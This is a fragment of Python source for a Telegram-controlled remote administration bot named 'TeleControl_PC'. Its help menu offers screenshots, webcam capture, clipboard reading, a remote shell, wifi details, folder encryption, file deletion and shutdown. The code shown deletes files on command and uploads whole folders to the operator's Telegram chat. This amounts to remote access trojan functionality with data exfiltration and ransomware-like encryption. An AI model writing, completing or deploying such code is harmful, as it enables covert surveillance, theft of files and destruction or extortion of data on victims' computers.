...
TOKEN = 'Past your telegram bot API'
...
def start(message):
    bot.send_message(message.chat.id, 'Welcome! To The TeleControl_PC\n')

@bot.message_handler(commands=['help'])
def help_msg(message):
    help_text = 'Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files.\n /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown \n/deletefile [ full path ] to delete a file \n /part for check HardDisk partations \n /upload_folder for upload all files present in a folder'
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['part'])
def harddrives(message):
    Drives = []
    ...
    if Drives:
        ...
        drives_text = "No drives found."

    bot.send_message(message.chat.id, drives_text)
...
def delete_file(message):
    bot.send_message(message.chat.id, 'to delete a file use /deletefile [ Full path of that file ]')
    file_name = message.text.split(' ', 1)[1]
    file_path = os.path.join(file_name)
    if os.path.exists(file_path):
        os.remove(file_path)
        bot.send_message(message.chat.id, 'File is Deleted')
...
@bot.message_handler(commands=['upload_folder'])
def handle_upload_folder_command(message):
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            folder_path = args[1]
            ...
            if os.path.exists(folder_path) and os.path.isdir(folder_path):
                ...
                if files:
                    ...
                    bot.send_message(message.chat.id, f"All files from the folder have been uploaded.")
                else:
                    bot.send_message(message.chat.id, "The folder is empty.")
            else:
                bot.send_message(message.chat.id, "The specified folder does not exist or is not a folder.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /upload_folder [FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
